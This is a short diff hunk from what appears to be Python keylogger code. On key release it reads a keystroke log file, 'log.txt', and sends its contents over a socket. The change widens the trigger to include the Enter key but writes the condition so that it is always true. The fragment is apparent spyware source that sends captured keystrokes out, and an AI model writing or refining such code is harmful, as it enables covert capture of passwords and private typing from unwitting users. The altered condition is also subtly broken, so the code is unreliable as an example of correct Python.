@@ -55,7 +55,7 @@ def press(key):
         
         
 def release(key):
-    if key == Key.space:
+    if key == Key.space or Key.enter:
         with open("log.txt", "r") as file1:
             contents = file1.read()
             s.send(contents.encode())
